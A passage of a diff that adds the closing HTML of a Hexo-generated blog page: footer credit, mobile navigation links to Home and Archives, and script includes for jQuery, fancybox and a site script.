+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
